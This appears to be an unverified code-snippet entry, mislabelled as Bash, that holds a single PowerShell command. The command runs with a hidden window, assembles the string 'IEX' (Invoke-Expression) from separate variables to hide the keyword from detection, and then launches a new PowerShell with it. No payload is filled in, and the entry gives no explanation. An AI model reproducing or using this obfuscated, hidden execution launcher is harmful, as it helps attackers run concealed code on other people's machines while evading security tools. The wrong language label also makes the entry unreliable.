---
id: 5ae09dd5-a32a-4cba-b1b5-13b1db67884f
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:21:10.829355+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 5ae09dd5

**Language**: Bash

```bash

powershell -window hidden -C "set-variable -name "LB" -value "I"; set-variable -name "I" -value "E"; set-variable -name "V" -value "X"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('')"

```
